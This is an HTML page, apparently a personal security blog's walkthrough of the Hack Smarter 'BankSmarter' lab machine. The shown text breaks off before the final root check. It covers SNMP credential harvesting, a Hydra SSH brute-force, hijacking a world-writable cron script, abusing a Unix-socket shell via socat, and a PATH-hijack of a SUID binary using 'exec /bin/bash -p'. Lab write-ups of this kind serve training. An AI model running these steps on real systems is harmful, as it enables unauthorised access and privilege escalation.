@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>BankSmarter | Jenn Shagrin</title>
+<meta name="description" content="Hack Smarter BankSmarter: SNMP credential exposure, a writable scheduled script, a Unix socket, and a root owned backup binary.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/banksmarter.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+<meta property="og:url" content="https://jennshaggy.github.io/banksmarter.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="BankSmarter">
+<meta property="og:description" content="Hack Smarter BankSmarter: SNMP credential exposure, a writable scheduled script, a Unix socket, and a root owned backup binary.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BankSmarter">
+<meta name="twitter:description" content="Hack Smarter BankSmarter: SNMP credential exposure, a writable scheduled script, a Unix socket, and a root owned backup binary.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/penetration-testing.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single technical-writeup">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">BankSmarter</h1>
+<div class="post-description">Hack Smarter challenge: SNMP credentials, a scheduled script in a writable directory, Ronnie's socket, and a path to root.</div>
+</header>
+<div class="post-content">
+<h2>Scenario</h2>
+
+<p>Hack Smarter tasked me with getting into a standalone Linux server and escalating to root.</p>
+
+<h2>Reconnaissance</h2>
+
+<p>Let's set our target IP as an environment variable and start scanning:</p>
+
+<pre><code>tip=10.0.29.84
+echo $tip</code></pre>
+
+<pre><code>rustscan -a $tip -- -A</code></pre>
+
+<p>Rustscan came back at the speed of light:</p>
+
+<pre><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 d0:1c:42:56:0e:62:4d:f5:48:3c:04:bf:68:c7:a2:93 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJHX4NH3aaCMcQVT/SZAfBXVD0OCBZ8+dW4Sz7xmpcxim0H0Zo0/zPdbjvUdOxrXhWGtpKkQikOiojlMMPL0ahc=
+|   256 43:8b:6c:cf:80:76:9d:ff:7c:8b:57:ae:a0:32:d1:b1 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII16dtjJrPwI2igqfqrzDtiK/kx20dR3JSGMELSl9Ka7
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+TCP/IP fingerprint:
+OS:SCAN(V=7.991%E=4%D=11/22%OT=22%CT=%CU=40336%PV=Y%DS=3%DC=T%G=N%TM=6B03E2
+OS:DF%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)O
+OS:PS(O1=M510ST11NW7%O2=M510ST11NW7%O3=M510NNT11NW7%O4=M510ST11NW7%O5=M510S
+OS:T11NW7%O6=M510ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)E
+OS:CN(R=Y%DF=Y%T=40%W=F507%O=M510NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
+OS:%F=R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=
+OS:G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 34.534 days (since Mon Oct 19 12:04:21 2026)
+Network Distance: 3 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   64.92 ms 10.200.0.1
+2   ...
+3   67.67 ms 10.0.29.84
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 23:53
+Completed NSE at 23:53, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 23:53
+Completed NSE at 23:53, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 23:53
+Completed NSE at 23:53, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
+           Raw packets sent: 46 (3.710KB) | Rcvd: 29 (2.870KB)</code></pre>
+
+<p>Not fully satisfied that the results from Rustscan are all we need. Let's run an Nmap that builds in service detection and see if we learn new information:</p>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.0.29.84</code></pre>
+
+<p>The results confirm the open port is, in fact, just Port 22. But the list of potentially exploitable vulnerabilities is madness.</p>
+
+<p>This is maybe 1/10th of the results:</p>
+
+<img src="/images/banksmarter/nmap-ssh-service.png" alt="nmap ssh service" loading="lazy">
+
+<h2>Initial access</h2>
+
+<p>It looks like we'll be cracking an SSH login.</p>
+
+<p>In a second terminal, let's see if Nmap can detect any UDP ports:</p>
+
+<pre><code>nmap -sU -p- 10.0.29.84</code></pre>
+
+<p>While that runs, back in our OG terminal, we'll run SNMPwalk and see if we can extract any usable information from the MIB:</p>
+
+<pre><code>snmpwalk -c public -v 2c 10.0.29.84</code></pre>
+
+<p>That was almost instantly useful. There are plaintext Admin credentials sitting in one of the first strings returned:</p>
+
+<img src="/images/banksmarter/snmp-exposed-credential-redacted.png" alt="SNMP response with exposed credential redacted" loading="lazy">
+
+<p><strong>Exposed Credentials:</strong></p>
+
+<pre><code>STRING: "\"Admin Layne.Stanley:&lt;REDACTED&gt;\""</code></pre>
+
+<p>We'll use Hydra to confirm Mr. Layne's SSH credentials (primarily, the username) are accurate. To do so, we'll create a personalized wordlist using combinations of his name and Admin position.</p>
+
+<p>We'll save this list as <code>sl_usernames.txt</code>:</p>
+
+<pre><code>nano sl_usernames.txt</code></pre>
+
+<pre><code>Layne.Stanley
+layne.stanley
+L.Stanley
+l.stanley
+Layne
+Stanley
+layne
+stanley
+lstanley
+Lstanley
+admin
+Admin
+Administrator
+administrator
+stanley.layne
+Stanley.Layne</code></pre>
+
+<img src="/images/banksmarter/username-candidates.png" alt="Username candidates saved in nano" loading="lazy">
+
+<p>Then <code>CTRL</code> + <code>o</code> to Save, <code>CTRL</code> + <code>x</code> to exit nano.</p>
+
+<p>Now we'll do the same with potential passwords. I can't display the list publicly because, well, I'd like you to learn how to do this the same way I did: healthy curiosity and research. Nothing wrong with having an LLM guide you through the process, either:</p>
+
+<pre><code>nano sl_passwords.txt</code></pre>
+
+<p>As an aside, that UDP scan has not come back yet. I will likely cancel it. I'll give it about 10 more minutes to show me what it's got.</p>
+
+<p>Back to Hydra. We're ready to run it:</p>
+
+<pre><code>hydra -L sl_usernames.txt -P sl_passwords.txt 10.0.29.84 ssh -I </code></pre>
+
+<p>Woo! We have a hit. Successful SSH credential extraction:</p>
+
+<img src="/images/banksmarter/hydra-login-redacted.png" alt="hydra login redacted" loading="lazy">
+
+<p>Time to SSH our way in:</p>
+
+<pre><code>ssh &lt;username&gt;@10.0.29.84</code></pre>
+
+<p>Type <code>yes</code> when asked, then enter the unearthed password and we're in:</p>
+
+<img src="/images/banksmarter/layne-ssh-login.png" alt="layne ssh login" loading="lazy">
+
+<pre><code>id
+whoami
+pwd
+ls -lah</code></pre>
+
+<img src="/images/banksmarter/layne-enumeration.png" alt="Layne's account and home directory enumeration" loading="lazy">
+
+<p>Alrighty. We have our user flag sitting in front of us. Let's grab it.</p>
+
+<pre><code>cat user.txt</code></pre>
+
+<img src="/images/banksmarter/user-flag-redacted.png" alt="user flag redacted" loading="lazy">
+
+<p>I'm fairly certain the user flag is randomly generated, but some part of my brain is nagging me to find out if it moonlights as an encoded hint.</p>
+
+<p>I'll leave well enough alone for now. On to the root flag.</p>
+
+<h2>From Layne to Scott</h2>
+
+<p>Our next move is to enumerate the Linux machine and see what we can find. One of the first directories to investigate on a Linux target is the <code>/tmp/</code> directory.</p>
+
+<p>It did not disappoint:</p>
+
+<img src="/images/banksmarter/bank-exports-directory.png" alt="bank exports directory" loading="lazy">
+
+<p><code>bank_exports</code> is looking pretty enticing. <code>bank_exports</code> is definitely custom to this environment, and it's owned by <code>scott.weiland</code> with a timestamp right after the machine started up.</p>
+
+<p>We still have a lot of unknowns, and LinPEAS can fill in the gaps. It's unlikely to be on this box, but we can download and run it in our SSH session without installing.</p>
+
+<p>PS: If you're not already in <code>/tmp</code>, <code>cd</code> yourself there first:</p>
+
+<pre><code>curl -fL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+chmod 700 linpeas.sh
+./linpeas.sh</code></pre>
+
+<p>Well, change of plans. The target most likely can't reach GitHub. It was worth a shot. Quick confirmation that it cannot reach GitHub:</p>
+
+<pre><code>curl -IL --connect-timeout 5 --max-time 15 https://github.com</code></pre>
+
+<img src="/images/banksmarter/github-connection-failed.png" alt="GitHub connection timed out on the target" loading="lazy">
+
+<p>Okay. That's confirmed.</p>
+
+<p>We can copy it from our local machine to the SSH session. If you need to install it first, here's how you do that AND copy it to the target:</p>
+
+<pre><code>curl -fL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+scp linpeas.sh layne.stanley@&lt;TARGET_IP&gt;:/tmp/</code></pre>
+
+<p>If you have it, skip the <code>curl</code> and go right for the <code>scp</code> command. Still on your local machine:</p>
+
+<img src="/images/banksmarter/linpeas-scp-transfer.png" alt="LinPEAS copied from Kali to the target with scp" loading="lazy">
+
+<p>Bam. Done.</p>
+
+<p>Back in our SSH session, we'll <code>chmod</code> it and launch LinPEAS from <code>/tmp</code>:</p>
+
+<pre><code>chmod 700 /tmp/linpeas.sh
+/tmp/linpeas.sh</code></pre>
+
+<p>I love LinPEAS. It provides extremely useful information, and a lot of it. Under <code>Processes, Crons, Timers, Services and Sockets</code> &gt; <code>Check for vulnerable cron jobs</code> &gt; <code>Services and Service Files</code>, we can spot <code>bank-pty.service</code>:</p>
+
+<img src="/images/banksmarter/bank-pty-service.png" alt="bank pty service" loading="lazy">
+
+<p>We now have two investigable paths and a lot to learn about them.</p>
+
+<p>A bit later in the LinPEAS output, we find this:</p>
+
+<img src="/images/banksmarter/scott-owned-backup-script.png" alt="scott owned backup script" loading="lazy">
+
+<p>In Layne's world-writable home directory, LinPEAS found <code>/home/layne.stanley/bankSmarter_backup.sh</code>, also owned by <code>scott.weiland</code>, and <code>/usr/local/bin/bank_backup.py</code>.</p>
+
+<img src="/images/banksmarter/layne-home-linpeas-listing.png" alt="LinPEAS lists Scott's backup script in Layne's home directory" loading="lazy">
+
+<p>Put simply, the backup script sits in a directory controlled by Layne, but owned by Scott. My best assessment is that Scott's scheduled task likely runs and creates <code>bank_exports</code>.</p>
+
+<p>We can hypothesize all day long, but that won't move the needle:</p>
+
+<pre><code>sed -n '1,180p' /home/layne.stanley/bankSmarter_backup.sh</code></pre>
+
+<p>We're looking for mentions the script path of <code>bank_exports</code> in the output.</p>
+
+<img src="/images/banksmarter/backup-script-exports.png" alt="backup script exports" loading="lazy">
+
+<p>This script sets <code>EXPORT_DIR="/tmp/bank_exports"</code>, confirming a direct connection to the directory. The script then writes to <code>/etc/bank_api_keys</code>, leading me to believe we'll need elevated privileges to run it.</p>
+
+<p>We'll run these three commands to try and connect some dots:</p>
+
+<pre><code>grep -nE 'query_accounts_from_db|bank_exports|bankSmarter_backup' /home/layne.stanley/bankSmarter_backup.sh
+
+systemctl cat bank-pty.service
+
+cat /usr/local/bin/bank_backup.py</code></pre>
+
+<img src="/images/banksmarter/service-unit-output.png" alt="Service unit runs PTY server as Ronnie" loading="lazy">
+
+<p>Still three separate pieces of the puzzle. <code>bank-pty.service</code> runs <code>/opt/bank/pty_server.py</code> as <code>ronnie.stone</code>.</p>
+
+<p><code>bank_backup.py</code> prints a demo message. The shell script shows <code>/tmp/bank_exports</code> , yet calls this function, <code>query_accounts_from_db</code>. <code>set -e</code> indicates that the script should stop before it writes a CSV file.</p>
+
+<img src="/images/banksmarter/backup-python-output.png" alt="Bank backup Python script prints a demo message" loading="lazy">
+
+<p>Let's see if files are appearing and who owns them:</p>
+
+<pre><code>ls -l /tmp/bank_exports</code></pre>
+
+<p>Well, <code>bank_exports</code> is empty but that doesn't mean it's useless.</p>
+
+<p>Let's see Layne's cron jobs:</p>
+
+<pre><code>crontab -l</code></pre>
+
+<img src="/images/banksmarter/empty-exports-and-crontab.png" alt="Empty bank exports directory and no crontab for Layne" loading="lazy">
+
+<p>Another nope. Perhaps the system cron directory bears fruit:</p>
+
+<pre><code>ls -l /etc/cron.d</code></pre>
+
+<img src="/images/banksmarter/system-cron-directory.png" alt="System cron directory contains only default entries" loading="lazy">
+
+<p>No bank script in <code>/etc/cron.d</code>. Scott owns a script in Layne's home directory, but we still haven't found what launches it.</p>
+
+<p>What Scott's script invokes is another question to answer:</p>
+
+<pre><code>cat /etc/crontab</code></pre>
+
+<img src="/images/banksmarter/system-crontab-output.png" alt="System crontab does not list the bank script" loading="lazy">
+
+<p>No bank script in <code>/etc/crontab</code>, either. Scott may be calling it from his personal crontab.</p>
+
+<p>I feel like I ran LinPEAS during a short duration where the bank script running. Let's poll the process list for the scripts name and see if my hunch is accurate:</p>
+
+<pre><code>while true; do ps -eo user,pid,args | grep '[b]ankSmarter_backup'; sleep 0.2; done</code></pre>
+
+<p>It took a while, but we caught it running:</p>
+
+<img src="/images/banksmarter/scott-scheduled-process.png" alt="scott scheduled process" loading="lazy">
+
+<p>Scott does indeed launch the backup from Layne's writable home directory. LinPEAS detailed a laundry list of available permissions. Before we change the script, let's double check them:</p>
+
+<pre><code>ls -ld /home/layne.stanley</code></pre>
+
+<img src="/images/banksmarter/layne-home-permissions.png" alt="Layne home directory has world writable permissions" loading="lazy">
+
+<p>Excellent news. The directory is writable by everyone and has no sticky bit. Even though Scott owns it, Layne can replace anything he wants inside that directory. It may take until the next ice age to run what we put there, but I digress.</p>
+
+<p>Our first step is preserve the original script so we can restore it and make a clean exit once we're done:</p>
+
+<pre><code>cp /home/layne.stanley/bankSmarter_backup.sh /tmp/bankSmarter_backup.original</code></pre>
+
+<p>We'll test the overly permissioned directory with an <code>id</code> record, and if all goes well, we move in for the win.</p>
+
+<p>Run these back to back, then wait about 5 minutes to run the third command:</p>
+
+<pre><code>printf '#!/bin/bash\nid &gt; /tmp/bank_job_identity.txt\n' &gt; /tmp/bank_job_test.sh
+
+mv /tmp/bank_job_test.sh /home/layne.stanley/bankSmarter_backup.sh</code></pre>
+
+<p>After you run the move command, type <code>y</code> when asked:</p>
+
+<img src="/images/banksmarter/writable-home-and-script-replacement.png" alt="writable home and script replacement" loading="lazy">
+
+<p>We don't know the run time between intervals, but let's just see if it's there:</p>
+
+<pre><code>cat /tmp/bank_job_identity.txt</code></pre>
+
+<img src="/images/banksmarter/scott-identity-proof.png" alt="Scheduled script ran as Scott Weiland" loading="lazy">
+
+<p>Success. <code>id</code> ran as Scott and with Scott's full group membership. Privilege step is confirmed.</p>
+
+<p><code>bank-pty.service</code> runs from <code>/opt/bank</code> as Ronnie, and Scott’s <code>bank-team</code> membership might just allow access there. Let's find out:</p>
+
+<pre><code>ls -ld /opt/bank /opt/bank/sockets</code></pre>
+
+<img src="/images/banksmarter/opt-bank-permissions.png" alt="Layne cannot access the bank sockets directory" loading="lazy">
+
+<p>Alright then. Layne can't enter <code>/opt/bank</code>, but we proved Scott's scheduled job has this group.</p>
+
+<p>Scott can likely see the socket used by Ronnie’s PTY service. Let's have the scheduled script record a directory listing and see if that's our hook:</p>
+
+<pre><code>printf '#!/bin/bash\nls -la /opt/bank /opt/bank/sockets &gt; /tmp/bank_scott_listing.txt 2&gt;&amp;1\n' &gt; /home/layne.stanley/bankSmarter_backup.sh</code></pre>
+
+<p>Wait a moment for it to run, then:</p>
+
+<pre><code>cat /tmp/bank_scott_listing.txt</code></pre>
+
+<img src="/images/banksmarter/scott-bank-socket-listing.png" alt="Scott can list Ronnie’s socket and PTY server" loading="lazy">
+
+<h2>From Scott to Ronnie</h2>
+
+<p>Very helpful. Ronnie owns <code>live.sock</code>, which is also accessible to <code>bank-team</code>. Scott also belongs to that group, and can also read <code>pty_server.py</code>.</p>
+
+<p>Before we connect to that socket, let's see what it does:</p>
+
+<pre><code>printf '#!/bin/bash\ncat /opt/bank/pty_server.py &gt; /tmp/bank_pty_code.txt 2&gt;&amp;1\n' &gt; /home/layne.stanley/bankSmarter_backup.sh</code></pre>
+
+<p>Wait for its next run, then...</p>
+
+<pre><code>cat /tmp/bank_pty_code.txt</code></pre>
+
+<p>An important find:</p>
+
+<img src="/images/banksmarter/ronnie-socket-code.png" alt="ronnie socket code" loading="lazy">
+
+<p><code>pty_server.py</code> listens on <code>live.sock</code> and, for each connection, starts <code>/bin/bash</code>.</p>
+
+<img src="/images/banksmarter/pty-server-shell-code.png" alt="PTY server forks and runs Bash for socket connections" loading="lazy">
+
+<p>Since the script starts <code>/bin/bash</code> for every socket connection, we'll run this command to see if <code>ronnie.stone</code> appears in the saved <code>id</code> output. That allows us to confirm whose privileges that shell has based on the response:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+printf 'id\nexit\n' | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /tmp/bank_socket_identity.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Let the scheduled run happen, then:</p>
+
+<pre><code>cat /tmp/bank_socket_identity.txt</code></pre>
+
+<p>At first, I ran the <code>cat</code> command too quickly. I waited a bit longer, and once it was there, no output.</p>
+
+<img src="/images/banksmarter/socket-identity-empty-output.png" alt="Initial socket identity file is absent and then empty" loading="lazy">
+
+<p>Sending <code>id</code> and <code>exit</code> together probably closed the connection too quickly.</p>
+
+<p>Let's try changing a line in the script that will briefly leave the connection open:</p>
+
+<pre><code>{ printf 'id\n'; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /tmp/bank_socket_identity.txt 2&gt;&amp;1</code></pre>
+
+<p>Well, that didn't work. Layne can't overwrite what Scott writes.</p>
+
+<img src="/images/banksmarter/socket-identity-permission-denied.png" alt="Layne cannot write the socket identity file in tmp" loading="lazy">
+
+<p>In our writable home directory, a new path should let the scheduled test capture the response:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf 'id\n'; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_socket_identity.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Let patience be your virtue (about 2-3 minutes), then run:</p>
+
+<pre><code>cat /home/layne.stanley/bank_socket_identity.txt</code></pre>
+
+<img src="/images/banksmarter/ronnie-socket-identity-proof.png" alt="Socket shell ran as Ronnie Stone" loading="lazy">
+
+<p>It worked. The socket opened a shell as <code>ronnie.stone</code> and membership in the <code>bankers</code> group.</p>
+
+<p>Courtesy of LinPEAS, we know Ronnie has access above and beyond Layne and Scott, and <code>/usr/local/bin/bank_backupd</code> has a root-owned SUID file associated with <code>bankers</code>.</p>
+
+<h2>From Ronnie to root</h2>
+
+<p>We'll investigate the <code>bank_backupd</code> binary as the next potentially crossable access boundary:</p>
+
+<pre><code>ls -l /usr/local/bin/bank_backupd</code></pre>
+
+<img src="/images/banksmarter/bank-backupd-permissions.png" alt="Bank backup binary is root owned and SUID executable by bankers" loading="lazy">
+
+<p>It takes its job as a binary seriously.</p>
+
+<p><code>-rwsr-x---</code> means it's root-owned, the SUID bit is set, and only root or members of <code>bankers</code> can execute it. Thankfully, we just confirmed that Ronnie is in <code>bankers</code>.</p>
+
+<p>Layne can't read the binary, but its readable strings might reveal which backup command it launches. We have to run this from the Ronnie shell we reached through the socket, which we can do by injecting this command into the scheduled script:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '%s\n' "strings /usr/local/bin/bank_backupd | grep -iE 'python|backup|system|exec|path'"; sleep 2; printf 'exit\n'; } | timeout 5s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_binary_strings.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Wait the 2-3 minutes, then:</p>
+
+<pre><code>cat /home/layne.stanley/bank_binary_strings.txt</code></pre>
+
+<p>Okay. The binary contains <code>python3</code>, <code>/usr/local/bin/bank_backup.py</code>, and <code>execv</code>. It looks like it launches the Python backup script.</p>
+
+<img src="/images/banksmarter/backup-binary-strings.png" alt="backup binary strings" loading="lazy">
+
+<p>Ronnie can execute the SUID binary named in the strings output. Let's see what the binary prints on a normal day when Ronnie runs it. Ideally, it will reference <code>python3</code> and a backup script:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '/usr/local/bin/bank_backupd\n'; sleep 3; printf 'exit\n'; } | timeout 8s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_backupd_output.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Wait 2-3 minutes again, then:</p>
+
+<pre><code>cat /home/layne.stanley/bank_backupd_output.txt</code></pre>
+
+<img src="/images/banksmarter/backup-binary-run.png" alt="backup binary run" loading="lazy">
+
+<p>Successfully ran the <code>bank_backupd</code> binary as Ronnie and started the Python script.</p>
+
+<p>Let's find out whose privileges this replacement Python interpreter will receive. We'll do this by running a stand-in file that records IDs...</p>
+
+<pre><code>cat &gt; /home/layne.stanley/python3 &lt;&lt;'EOF'
+#!/bin/sh
+/usr/bin/id &gt; /home/layne.stanley/bank_suid_probe.txt
+EOF
+chmod +x /home/layne.stanley/python3</code></pre>
+
+<p>...and we'll have the scheduled job run the binary through Ronnie’s socket with our home directory listed first in <code>PATH</code>:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 3; printf 'exit\n'; } | timeout 8s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_path_test.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Wait 2-3 minutes, then:</p>
+
+<pre><code>cat /home/layne.stanley/bank_suid_probe.txt</code></pre>
+
+<img src="/images/banksmarter/suid-probe-permission-denied.png" alt="Layne cannot read the SUID probe output" loading="lazy">
+
+<p>Not as dramatic as it seems. The probe file landed, but Layne can't read it. We likely created a restricted file. Let's investigate:</p>
+
+<pre><code>ls -l /home/layne.stanley/bank_suid_probe.txt /home/layne.stanley/bank_path_test.txt</code></pre>
+
+<img src="/images/banksmarter/suid-probe-root-ownership.png" alt="SUID probe output is owned by root" loading="lazy">
+
+<p>The <code>python3</code> stand-in probe ran as <code>root:root</code>, hence, why Layne couldn't read it. We know we can change privileges, so let's use that to our advantage.</p>
+
+<p>We'll have the <code>python3</code> stand-in open a privileged shell and ask it for <code>id</code> by replacing it with:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/python3 &lt;&lt;'EOF'
+#!/bin/sh
+exec /bin/bash -p
+EOF</code></pre>
+
+<p>Now we replace the scheduled script:</p>
+
+<pre><code>cat &gt; /home/layne.stanley/bankSmarter_backup.sh &lt;&lt;'EOF'
+#!/bin/bash
+{ printf '%s\n' 'PATH=/home/layne.stanley:$PATH /usr/local/bin/bank_backupd'; sleep 2; printf 'id\n'; sleep 2; printf 'exit\n'; sleep 1; printf 'exit\n'; } | timeout 10s socat - UNIX-CONNECT:/opt/bank/sockets/live.sock &gt; /home/layne.stanley/bank_root_identity.txt 2&gt;&amp;1
+EOF</code></pre>
+
+<p>Another 2-3 minute wait, then:</p>
+
+<pre><code>cat /home/layne.stanley/bank_root_identity.txt</code></pre>
+
